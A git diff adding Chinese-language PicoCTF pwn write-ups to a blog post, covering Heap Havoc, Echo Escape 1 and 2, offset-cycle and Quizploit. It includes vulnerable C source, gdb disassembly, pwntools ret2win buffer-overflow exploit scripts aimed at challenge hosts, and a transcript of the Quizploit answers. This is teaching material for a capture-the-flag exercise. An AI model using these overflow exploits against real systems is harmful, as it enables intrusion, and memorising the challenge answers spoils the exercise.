@@ -6,7 +6,7 @@ tags: ["PicoCTF"]
 category: CTF
 licenseName: "CC BY-NC-SA 4.0"
 author: Windson
-draft: true
+draft: false
 cover: "https://img.windson.cc/images/categories/picoctf.svg"
 ---
 
@@ -368,7 +368,7 @@ print(plain_bytes.decode())
 ***
 
 # Pwn
-
+> 在進入這邊之前，可以先閱讀這篇[文章](https://mks.tw/2968/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-%E6%A6%82%E5%BF%B5)，會讓你輕鬆很多，~~也就是如果你帶點基礎來看我就不用寫的這麼詳細~~。
 ## Heap Havoc
 [題目](https://play.picoctf.org/practice/challenge/763?category=6&originalEvent=79&page=1)給了一個 binary 以及他的 C。從 C 的程式可以看到
 ```C
@@ -436,7 +436,7 @@ pwndbg> x/3wx 0x0804d610
 0x804d610:      0x00000002      0x0804d620      0x00000000
               i2 -> priority    i2 -> name      i2 -> callback()
 ```
-知道他們的位置之後，`i1 -> name` 跟 `i2 -> name` 的距離就是 0x0804d610 - 0x0804d600 = 0x20 = 16
+知道他們的位置之後，`i1 -> name` 跟 `i2 -> name` 的距離就是 0x0804d610 - 0x0804d600 = 0x20 = 16。
 ```python
 from pwn import *
 
@@ -445,7 +445,7 @@ context.log_level = 'debug'
 
 r = remote("foggy-cliff.picoctf.net", 54943)
 
-OFFSET = 20                  ## 這邊要蓋掉 priority 所以 +4
+OFFSET = 20                  ## 這邊要蓋掉 i2->priority 所以 +4
 BSS_ADDR = 0x0804c888        
 WINNER_ADDR = 0x080492b6
 
@@ -462,13 +462,377 @@ r.interactive()
 ```
 
 ## Echo Escape 1
+[題目](https://play.picoctf.org/practice/challenge/755?category=6&originalEvent=79&page=1)給了一個 binary 跟 code。先來看 code。
+```C
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+
+void win() {
+    FILE *fp = fopen("flag.txt", "rb");
+    if (!fp) {
+        perror("[!] Failed to open flag.txt");
+        return;
+    }
+
+    char buffer[128];
+    size_t n = fread(buffer, 1, sizeof(buffer), fp);
+    fwrite(buffer, 1, n, stdout);
+    fflush(stdout);
+    printf("\n");
+    fclose(fp);
+}
+
+int main() {
+    char buf[32]; 
+
+    printf("Welcome to the secure echo service!\n");
+    printf("Please enter your name: ");
+    fflush(stdout);
+
+    read(0, buf, 128);
+
+    printf("Hello, %s\n", buf);
+    printf("Thank you for using our service.\n");
+
+    return 0;
+}
+```
+這是一個典型的 ret2win。前面宣告的 buffer 只有 32 byte，但 `read()` 卻可以接受 128 byte。所以我們只要進行 [Buffer Over Flow]() 就可以把 return address 改到 `win()` 。先用 gdb 看看我們的目標在哪個位置。
+```
+pwndbg> disas main
+Dump of assembler code for function main:
+   0x00000000004012fb <+0>:     endbr64
+   0x00000000004012ff <+4>:     push   rbp
+   0x0000000000401300 <+5>:     mov    rbp,rsp
+   0x0000000000401303 <+8>:     sub    rsp,0x20
+   0x0000000000401307 <+12>:    lea    rdi,[rip+0xd22]        # 0x402030
+   0x000000000040130e <+19>:    call   0x4010e0 <puts@plt>
+   0x0000000000401313 <+24>:    lea    rdi,[rip+0xd3a]        # 0x402054
+   0x000000000040131a <+31>:    mov    eax,0x0
+   0x000000000040131f <+36>:    call   0x401110 <printf@plt>
+   0x0000000000401324 <+41>:    mov    rax,QWORD PTR [rip+0x2d4d]        # 0x404078 <stdout@@GLIBC_2.2.5>
+   0x000000000040132b <+48>:    mov    rdi,rax
+   0x000000000040132e <+51>:    call   0x401130 <fflush@plt>
+   0x0000000000401333 <+56>:    lea    rax,[rbp-0x20]
+   0x0000000000401337 <+60>:    mov    edx,0x80
+   0x000000000040133c <+65>:    mov    rsi,rax
+   0x000000000040133f <+68>:    mov    edi,0x0
+   0x0000000000401344 <+73>:    call   0x401120 <read@plt>
+   0x0000000000401349 <+78>:    lea    rax,[rbp-0x20]
+   0x000000000040134d <+82>:    mov    rsi,rax
+   0x0000000000401350 <+85>:    lea    rdi,[rip+0xd16]        # 0x40206d
+   0x0000000000401357 <+92>:    mov    eax,0x0
+   0x000000000040135c <+97>:    call   0x401110 <printf@plt>
+   0x0000000000401361 <+102>:   lea    rdi,[rip+0xd10]        # 0x402078
+   0x0000000000401368 <+109>:   call   0x4010e0 <puts@plt>
+   0x000000000040136d <+114>:   mov    eax,0x0
+   0x0000000000401372 <+119>:   leave
+   0x0000000000401373 <+120>:   ret
+End of assembler dump.
+```
+我們要找的人在 `call read@plt` 的前面，因為要先準備好暫存器才可以 call function。在 x86_64 裡，$rax 是用來接收回傳值的，所以存放我們輸入的暫存器就是 rbp-0x20。依照 stack 存放的方式，我們需要 32（offset） + 8（rbp）個 byte，就可以到return address。
+```python
+from pwn import *
+context.arch = 'amd64'
+
+elf = ELF('./vuln')
+r = remote('mysterious-sea.picoctf.net',58762)
+
+# Offset = 32 (offset) + 8 (rbp) = 40
+win_addr = elf.symbols['win']
+payload = b'A' * 40 + p64(win_addr)
+
+r.send(payload)
+r.interactive()
+```
 
 ## Echo Escape 2
+[這題](https://play.picoctf.org/practice/challenge/736?category=6&originalEvent=79&page=1)跟前一題的作法一模一樣，可以依樣畫葫蘆，我就不寫這題了。
+```python
+from pwn import *
+context.arch = 'i386'
 
-## offset-cycle
+# 1. 建立連線
+r = remote('dolphin-cove.picoctf.net', 63023)
+elf = ELF('./vuln')
 
-## offset-cycleV2
+# 2. 定義目標位址 (win function)
+win_addr = elf.symbols['win']
+
+# 3. 構造 Payload
+# 40(offset) + 4(rbp) bytes  + 目標位址
+payload = b'A' * 44 + p32(win_addr)
+
+# 4. 發送並獲取 Flag
+r.sendline(payload)
+r.interactive()
+```
+
+## offset-cycle & offset-cycleV2
+這兩題都是 ret2win，只是只能在他的機器上操作，而且還有限時。進去要先
+```bash
+./start
+```
+他會給你題目，C code 是一樣的，但是在時限內沒做完就會重置。每次裡面的 offset 會變，建議先寫好 exploit 之後進去找 offset，快速出來修改、執行。其實就是拼手速，沒有什麼特別的。
 
 ## Quizploit
+[這題](https://play.picoctf.org/practice/challenge/727?category=6&originalEvent=79&page=1)要先下載他的執行檔，他會問你一些相關問題，全部答對就可以拿到 flag。
+先用 gdb 執行他的程式。
+```
+pwndbg> checksec
+File:     /home/kali/Downloads/vuln
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+這樣可以知道很多東西，也可以把 C code 放在旁邊。
 
+```
+[*] Question number 0x1:
+
+Is this a '32-bit' or '64-bit' ELF? (e.g. 100-bit)
+
+💡 Hint: Check if the system is x86_64 or x86. No compilation flag specified means default.
+
+>> 64-bit
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 可以在 checksec 中看到，Arch: amd64，代表他是 64 bits 架構
+
+
+[*] Question number 0x2:
+
+What's the linking of the binary? (e.g. static, dynamic)
+
+💡 Hint: The program uses standard library functions like fprintf, fgets, and system.
+
+>> dynamic
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 在checksec 中可以知道他有開 RELRO，絕對是動態。底下的連結會告訴你 RELOR 是什麼
+
+
+[*] Question number 0x3:
+
+Is the binary 'stripped' or 'not stripped'?
+
+💡 Hint: By default, binaries compiled without the -s flag contain debugging symbols.
+
+>> not stripped
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// checksec 有寫
+
+
+[*] Question number 0x4:
+
+Looking at the vuln() function, what is the size of the buffer in bytes? (e.g. 0x10)
+
+💡 Hint: Check the declaration in the function and answer in either hex or decimal
+
+>> 21
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// source code 裡有答案
+
+[*] Question number 0x5:
+
+How many bytes are read into the buffer? (e.g. 0x10)
+
+💡 Hint: Check the fgets
+
+>> 144
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// source code 裡有答案
+
+[*] Question number 0x6:
+
+Is there a buffer overflow vulnerability? (yes/no)
+
+💡 Hint: Compare buffer size and input size
+
+>> yes
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// fgets 限制的輸入大小比 buffer 還要大，所以可以用 BOF
+
+[*] Question number 0x7:
+
+Name a standard C function that could cause a buffer overflow in the provided C code.
+
+💡 Hint: (e.g. fprintf)
+
+>> fgets
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+
+[*] Question number 0x8:
+
+What is the name of function which is not called any where in the program?
+
+💡 Hint: Analyze the source
+
+>> win
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// source code 裡有答案
+
+[*] Question number 0x9:
+
+What type of attack could exploit this vulnerability? (e.g. format string, buffer overflow, etc.)
+
+💡 Hint: Try interpreting the information gathered so far
+
+>> buffer overflow
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 這跟第六題一樣
+
+
+[*] Question number 0xa:
+
+How many bytes of overflow are possible? (e.g. 0x10)
+
+💡 Hint: Subtract values
+
+>> 123   
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 拿 fgets 的大小 - buffer 的大小
+
+[*] Question number 0xb:
+
+What protection is enabled in this binary?
+
+💡 Hint: Learn to use checksec
+
+>> NX
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// checksec 裡有
+
+[*] Question number 0xc:
+
+What exploitation technique could bypass NX? (e.g. shellcode, ROP, format string)
+
+💡 Hint: Choose from the options
+
+>> ROP
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 底下的連結會告訴你 ROP 是什麼
+
+[*] Question number 0xd:
+
+What is the address of 'win()' in hex? (e.g. 0x4011eb)
+
+💡 Hint: Use gdb/objdump to find the address
+
+>> 0x401176
+
+
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+✅                    ✅
+✅      Correct!      ✅
+✅                    ✅
+✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ 
+
+// 在 gdb 中輸入：p win
+
+
+=========================================================================================================
+QUIZ COMPLETE!
+=========================================================================================================
+
+🎉 PERFECT SCORE! 🎉
+You got 13/13 questions correct!
+
+Flag:
+```
+
+- 這題的一些連結  
+    - [What is RELOR](https://ctf101.org/binary-exploitation/relocation-read-only/)
+    - [What is ROP](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/)
+
+***
+以上就是這次的 Writeup。Writeup 就是要給不會的人看的，所以如果看不懂的話，歡迎寫信來問，我會檢討。但要寫信來問的之前至少要會操作 Linux ，還有把這篇的連結看完，~~我不信有人看完了還不會~~。下一場 CTF 是 My first CTF，要打的歡迎來報團。
 
